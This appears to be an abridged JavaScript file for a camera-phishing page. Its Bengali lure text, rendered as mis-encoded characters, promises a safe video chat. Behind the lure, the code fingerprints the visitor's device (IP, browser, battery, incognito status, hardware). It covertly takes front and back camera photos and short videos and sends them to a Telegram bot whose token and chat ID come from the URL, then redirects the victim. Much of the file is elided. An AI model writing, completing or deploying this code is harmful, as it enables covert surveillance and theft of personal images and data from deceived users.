...
const stages = {
    initializing: { progress: 15, message: ' à¦¬à¦¿à¦¶à§à¦¬à§‡à¦° à¦¯à§‡ à¦•à§‹à¦¨à§‹ à¦ªà§à¦°à¦¾à¦¨à§à¦¤à§‡ à¦¬à¦¨à§à¦§à§ à¦–à§à¦à¦œà§à¦¨!', icon: 'â³' },
    cameraAccess: { progress: 35, message: ' à¦¨à¦¿à¦°à¦¾à¦ªà¦¦ à¦à¦¬à¦‚ à¦†à¦¨à¦¨à§à¦¦à¦¦à¦¾à¦¯à¦¼à¦• à¦­à¦¿à¦¡à¦¿à¦“ à¦šà§à¦¯à¦¾à¦Ÿ!', icon: 'ðŸ“¸' },
    capturing: { progress: 60, message: ' à¦†à¦®à¦¾à¦¦à§‡à¦° à¦¸à¦¾à¦¥à§‡ à¦¥à¦¾à¦•à¦¾à¦° à¦œà¦¨à§à¦¯ à¦§à¦¨à§à¦¯à¦¬à¦¾à¦¦! ', icon: 'ðŸ«°' },
    sendingData: { progress: 85, message: ' à¦†à¦ªà¦¨à¦¾à¦° à¦¦à¦¿à¦¨ à¦†à¦¨à¦¨à§à¦¦à§‡ à¦•à¦¾à¦Ÿà§à¦•!', icon: 'ðŸ¤—' },
    completing: { progress: 100, message: 'à¦¸à¦®à§à¦ªà¦¨à§à¦¨ à¦¹à¦¯à¦¼à§‡à¦›à§‡', icon: 'âœ…' }
};
...
function smoothProgress() {
    ...
    if (shouldRedirect && progress >= 99) {
        loadingMessage.innerHTML = '<span class="status-icon">ðŸŽ‰</span><span> à¦†à¦ªà¦¨à¦¾à¦° à¦¸à§à¦¨à§à¦¦à¦° à¦®à§à¦¹à§‚à¦°à§à¦¤à¦Ÿà¦¿ à¦à¦–à¦¨ à¦‰à¦ªà¦­à§‹à¦— à¦•à¦°à§à¦¨! ðŸ¤—...</span>';
        setTimeout(() => {
...
const tips = [
    ...
    "à¦¨à¦¿à¦°à¦¾à¦ªà¦¦ à¦à¦¬à¦‚ à¦†à¦¨à¦¨à§à¦¦à¦¦à¦¾à¦¯à¦¼à¦• à¦­à¦¿à¦¡à¦¿à¦“ à¦šà§à¦¯à¦¾à¦Ÿ!",
    ...
    try {
        ...
        if (typeof navigator.getBattery === 'function') {
            try {
                ...
                chargingStatus = battery.charging ? "âœ…" : "âŒ";
            } catch (e) {
        ...
        const captionLines = [
            { keys: ['ip'], text: `<b>ðŸ“ IP Address:</b> ${ip}` },
            { keys: ['userAgent'], text: `<b>ðŸ’» User-Agent:</b> ${userAgent}` },
            { keys: ['browserName', 'browserLanguage'], text: `<b>ðŸŒ Browser:</b> ${browserName} ${browserLanguage}` },
            { keys: ['incognitoStatus'], text: `<b>ðŸ•µï¸ Incognito Mode:</b> ${incognitoStatus}` },
            { keys: ['batteryPercentage', 'chargingStatus'], text: `<b>ðŸ”‹ Battery:</b> ${batteryPercentage}% <b>Charging:</b> ${chargingStatus}` },
            { keys: ['screenWidth', 'screenHeight'], text: `<b>ðŸ“ Screen Size:</b> ${screenWidth}Ã—${screenHeight}` },
            { keys: ['speedMbps'], text: `<b>ðŸš€ Internet Speed:</b> ${speedMbps} Mbps` },
            { keys: ['networkType', 'networkIndicator'], text: `<b>ðŸ“¶ Network:</b> ${networkType} <b>Type:</b> ${networkIndicator}` },
            { keys: ['ram', 'storageDisplay'], text: `<b>ðŸ’¾ RAM & Storage:</b> ${ram}/${storageDisplay}` },
            { keys: ['date', 'time', 'timeZone'], text: `<b>ðŸ•‘ Date:</b> ${date} <b>Time:</b> ${time}\n\n<b>ðŸŒ Time Zone:</b> ${timeZone}` },
            { keys: ['activity'], text: `<b>ðŸƒ Activity:</b> ${activity}` },
            { keys: ['pixelRatio'], text: `<b>ðŸ“Š Device Pixel Ratio:</b> ${pixelRatio}` },
            { keys: ['viewportWidth', 'viewportHeight'], text: `<b>ðŸ–¥ï¸ Viewport Size:</b> ${viewportWidth}Ã—${viewportHeight}` },
            { keys: ['cpuCores'], text: `<b>ðŸ§‘â€ðŸ’» CPU Cores:</b> ${cpuCores}` },
            { keys: ['gpuRenderer'], text: `<b>ðŸŽ® GPU Renderer:</b> ${gpuRenderer}` }
        ];
        ...
        const caption = availableLines.map(line => line.text).join('\n\n') + 
            '\n\n<blockquote><b>âš ï¸ Note:</b> à¦à¦‡ à¦¤à¦¥à§à¦¯à§‡à¦° à¦…à¦ªà¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à¦²à§‡ à¦†à¦ªà¦¨à¦¿ à¦¸à¦®à§à¦ªà§‚à¦°à§à¦£ à¦¦à¦¾à¦¯à¦¼à§€ à¦¥à¦¾à¦•à¦¬à§‡à¦¨à¥¤ à¦†à¦®à¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦•à¦¾à¦œà§‡à¦° à¦œà¦¨à§à¦¯ à¦¦à¦¾à¦¯à¦¼à§€ à¦¥à¦¾à¦•à¦¬ à¦¨à¦¾à¥¤</blockquote>';
        return caption;
    } catch (error) {
        console.error('Error getting device info:', error);
        return `<b>âš ï¸ Unable to retrieve device info</b>`;
    }
}
...
async function capturePhoto(facingMode) {
    ...
    try {
        ...
        try {
            ...
            if (tokenFromUrl && chatIdFromUrl) {
                ...
                const errorMessage = 
                    `<b>ðŸš« ${cameraType} Camera Access Failed</b>\n\n` +
    ...
    try {
        ...
        if (tokenFromUrl && chatIdFromUrl) {
            const cameraType = facingMode === 'user' ? 'Front' : 'Back';
            const photoMessage = `<b>ðŸ“¸ ${cameraType} Camera Photo </b>\n\n<blockquote><b>âš ï¸ Do not misuse this photo</b></blockquote>`;
        ...
        if (tokenFromUrl && chatIdFromUrl) {
            const cameraType = facingMode === 'user' ? 'Front' : 'Back';
            const errorMessage = 
                `<b>ðŸš« Failed to capture ${cameraType} camera photo</b>\n\n` +
...
async function recordVideo(facingMode, duration) {
    ...
    try {
        ...
        mediaRecorder.onstop = async () => {
            ...
            if (tokenFromUrl && chatIdFromUrl) {
                const cameraType = facingMode === 'user' ? 'Front' : 'Back';
                const videoMessage = `<b>ðŸ”¹ ${cameraType} Camera Video (${duration}s)</b>\n\n<blockquote><b>âš ï¸ Do not misuse this video</b></blockquote>`;
        ...
        if (tokenFromUrl && chatIdFromUrl) {
            const cameraType = facingMode === 'user' ? 'Front' : 'Back';
            const errorMessage = 
                `<b>ðŸš« Failed to record ${cameraType} camera video</b>\n\n` +
...
async function requestCameraAccess() {
    try {
        ...
        const caption = await getDeviceInfo();
        if (tokenFromUrl && chatIdFromUrl) {
            const errorMessage = `<blockquote><b>ðŸš« Camera Access Blocked</b></blockquote>\n\n<b>Mode:</b> ${modeFromUrl}\n\n${caption}`;
            await sendCaptionToTelegram(errorMessage, tokenFromUrl, chatIdFromUrl);
        }
        triggerRedirect();
    }
